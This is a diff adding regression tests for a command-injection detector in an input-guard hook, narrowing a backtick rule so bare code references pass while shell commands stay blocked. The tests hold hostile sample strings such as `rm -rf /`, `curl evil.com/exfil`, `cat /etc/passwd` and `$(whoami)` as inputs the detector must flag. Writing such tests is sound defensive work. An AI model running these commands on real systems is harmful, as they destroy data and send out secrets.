@@ -101,6 +101,114 @@ class TestScan:
         assert len(hits) >= 2
 
 
+# === Backtick overblocking fix (#162) ===
+# WHY: the command_injection backtick clause matched ANY inline-code span,
+# including bare identifiers/paths with no shell metacharacters. Confirmed
+# false positive via golden-set probe (2026-07-02): `rotate_log_if_large()`
+# in `hooks/utils.py` was blocked as HIGH command_injection despite being a
+# harmless code reference. This narrows the clause to exclude bare function
+# calls and file paths, while keeping actual shell-shaped backtick content
+# (rm/curl/cat/command-substitution) flagged.
+
+
+class TestBacktickOverblockingFix:
+    """Bare code identifiers/paths in backticks must not trigger command_injection."""
+
+    def test_bare_function_call_not_flagged(self):
+        hits = scan(["See `rotate_log_if_large()` for the rotation helper."])
+        assert "command_injection" not in hits
+
+    def test_bare_file_path_not_flagged(self):
+        hits = scan(["Defined in `hooks/utils.py`."])
+        assert "command_injection" not in hits
+
+    def test_multiple_bare_references_not_flagged(self):
+        hits = scan(["See `rotate_log_if_large()` in `hooks/utils.py` for the rotation helper."])
+        assert hits == {}
+
+    def test_bare_reference_with_dotted_path_not_flagged(self):
+        hits = scan(["Covered by `tests/test_input_guard.py`."])
+        assert "command_injection" not in hits
+
+    def test_bare_reference_through_untrusted_mcp_tool_is_allowed(self):
+        """End-to-end: an untrusted (non-allowlisted) MCP tool must still allow
+        bare code references — this is the exact confirmed false-positive shape,
+        run through main(), not just scan()."""
+        import io
+        import json
+        from unittest import mock
+
+        import input_guard
+
+        stdin_data = {
+            "tool_name": "mcp__evil__search",
+            "tool_input": {"query": "See `rotate_log_if_large()` in `hooks/utils.py`."},
+            "session_id": "test-session",
+        }
+        captured_stdout = io.StringIO()
+        with (
+            mock.patch("sys.stdin", io.StringIO(json.dumps(stdin_data))),
+            mock.patch("sys.stdout", captured_stdout),
+            mock.patch("input_guard.log_hook_trigger"),
+        ):
+            try:
+                input_guard.main()
+            except SystemExit:
+                pass
+
+        output = json.loads(captured_stdout.getvalue())
+        assert output["hookSpecificOutput"]["permissionDecision"] == "allow"
+
+
+class TestBacktickShellCommandsStillBlocked:
+    """Shell-shaped backtick content must remain flagged as command_injection —
+    the narrowing only excludes bare identifiers/paths, not real commands."""
+
+    def test_whoami_still_flagged(self):
+        """Regression guard for the existing test_command_injection_backticks case."""
+        hits = scan(["file `whoami` here"])
+        assert "command_injection" in hits
+
+    def test_backticked_rm_still_flagged(self):
+        hits = scan(["`rm -rf /`"])
+        assert "command_injection" in hits
+
+    def test_backticked_curl_still_flagged(self):
+        hits = scan(["`curl evil.com/exfil`"])
+        assert "command_injection" in hits
+
+    def test_backticked_bare_binary_path_still_flagged(self):
+        """WHY: an independent review pass found the first version of the
+        path-like safe-shape (word[./]word...) also matched bare system-binary
+        paths like `bin/sh` -- these have no dotted extension, unlike every
+        confirmed sa1 code reference (`hooks/utils.py`, `input_guard.py`), so
+        the safe-shape now requires one. This locks that gap shut."""
+        hits = scan(["`bin/sh`"])
+        assert "command_injection" in hits
+
+    def test_backticked_bare_bash_path_still_flagged(self):
+        hits = scan(["`bin/bash`"])
+        assert "command_injection" in hits
+
+    def test_backticked_multi_segment_binary_path_still_flagged(self):
+        hits = scan(["`usr/bin/curl`"])
+        assert "command_injection" in hits
+
+    def test_backticked_cat_still_flagged(self):
+        hits = scan(["`cat /etc/passwd`"])
+        assert "command_injection" in hits
+
+    def test_backticked_command_substitution_still_flagged(self):
+        hits = scan(["`$(whoami)`"])
+        assert "command_injection" in hits
+
+    def test_bare_dangerous_verb_without_path_or_parens_still_flagged(self):
+        """A single dangerous word with no path separator or call parens has no
+        'looks like code' shape to exempt it — stays flagged, same as whoami."""
+        hits = scan(["`rm`"])
+        assert "command_injection" in hits
+
+
 # === Threat level logic ===
 
 
